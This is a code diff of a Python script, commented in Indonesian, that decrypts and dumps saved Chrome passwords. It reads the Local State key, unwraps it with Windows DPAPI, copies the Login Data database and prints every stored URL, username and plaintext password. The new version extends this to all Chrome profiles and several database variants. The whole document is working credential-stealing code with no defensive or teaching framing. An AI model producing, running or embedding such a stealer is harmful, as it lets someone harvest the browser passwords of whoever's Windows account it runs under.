@@ -1,93 +1,63 @@
 import os
 import json
-import base64
+from base64 import b64decode
 import sqlite3
-import win32crypt
+from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 import shutil
-from datetime import timezone, datetime, timedelta
 
-# Fungsi untuk mengonversi format tanggal dan waktu Chrome ke objek datetime Python
-def get_chrome_datetime(chromedate):
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+# Fungsi untuk mendapatkan kunci master dari file Local State Chrome
+def get_master_key(local_state):
+    with open(local_state, "r", encoding="utf-8") as f:
+        state = json.loads(f.read())
+    master_key = b64decode(state["os_crypt"]["encrypted_key"])[5:]  # Mengambil kunci terenkripsi
+    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]  # Mendekripsi kunci master
+    return master_key
 
-# Fungsi untuk mendapatkan kunci enkripsi dari file "Local State" dalam instalasi Chrome
-def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                                    "Google", "Chrome", "User Data", "Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
-
-    # Mendekode kunci enkripsi dari base64
-    key = base64.b64decode(local_state['os_crypt']["encrypted_key"])
-    # Hapus DPAPI str
-    key = key[5:]
-    # Mengembalikan kunci yang telah dideskripsi yang awalnya dienkripsi
-    # Menggunakan kunci sesi yang berasal dari kredensial masuk pengguna saat ini
-    # Dokumentasi: http://timgolden.me.uk/pywin32-docs/win32crypt.html
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
-# Fungsi untuk mendekripsi kata sandi yang dienkripsi dalam basis data Chrome
-def decrypted_password(password, key):
+# Fungsi untuk mendekripsi password menggunakan kunci master
+def decrypt_password(buff, master_key):
     try:
-        # Dapatkan vektor inisialisasi
-        iv = password[3:15]
-        password = password[15:]
-        # Hasilkan sandi
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        # Dekripsi kata sandi
-        return cipher.decrypt(password)[:-16].decode()
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()  # Menghapus byte akhir
+        return decrypted_pass
     except:
-        try:
-            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-        except:
-            # Tidak didukung
-            return ""
+        return "Decryption Failed"
 
-# Fungsi utama untuk mengekstrak dan menampilkan informasi login dari basis data Chrome
-def main():
-    # Dapatkan kunci AES
-    key = get_encryption_key()
-    # Path basis data lokal Chrome SQLite
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "Google", "Chrome", "User Data", "default", "Login Data")
-    # Salin file ke lokasi lain karena basis data akan terkunci jika Chrome sedang berjalan
-    filename = "ChromeData.db"
-    shutil.copyfile(db_path, filename)
-    # Terhubung ke basis data
-    db = sqlite3.connect(filename)
-    cursor = db.cursor()
-    # Tabel `logins` berisi data yang diperlukan
-    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-    # Iterasi semua baris
-    for row in cursor.fetchall():
-        origin_url = row[0]
-        action_url = row[1]
-        username = row[2]
-        password = decrypted_password(row[3], key)
-        date_created = row[4]
-        date_last_used = row[5]
-        if username or password:
-            print(f"URL Asal: {origin_url}")
-            print(f"URL Aksi: {action_url}")
-            print(f"Username: {username}")
-            print(f"Password: {password}")
-        else:
-            continue
-        if date_created != 86400000000 and date_created:
-            print(f"Tanggal Pembuatan: {str(get_chrome_datetime(date_created))}")
-        if date_last_used != 86400000000 and date_last_used:
-            print(f"Terakhir Digunakan: {str(get_chrome_datetime(date_last_used))}")
-        print("=" * 50)
-    cursor.close()
-    db.close()
+# Fungsi untuk mengekstrak data login dari database Chrome
+def extract_login_data(login_data_path, master_key):
+    if not os.path.exists(login_data_path):
+        return
+    temp_path = "temp_login_data"
+    shutil.copy2(login_data_path, temp_path)
+    conn = sqlite3.connect(temp_path)
+    cursor = conn.cursor()
     try:
-        # Coba hapus file basis data yang disalin
-        os.remove(filename)
-    except:
-        pass
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url, username, encrypted_password = r
+            if username:
+                decrypted_password = decrypt_password(encrypted_password, master_key)
+                print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*50}")
+    except Exception as e:
+        print(f"Error processing {login_data_path}: {e}")
+    finally:
+        cursor.close()
+        conn.close()
+        os.remove(temp_path)
 
-# Jalankan fungsi utama jika skrip dijalankan secara langsung
 if __name__ == "__main__":
-    main()
+    user_data_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data")
+    local_state_path = os.path.join(user_data_path, "Local State")
+    master_key = get_master_key(local_state_path)
+
+    for profile_folder in os.listdir(user_data_path):
+        profile_path = os.path.join(user_data_path, profile_folder)
+        if os.path.isdir(profile_path):
+            # Memeriksa berbagai varian file Login Data
+            login_data_variants = ["Login Data", "Login Data for Account", "Login Data-journal", "Login Data for Account-journal"]
+            for variant in login_data_variants:
+                login_data_path = os.path.join(profile_path, variant)
+                extract_login_data(login_data_path, master_key)
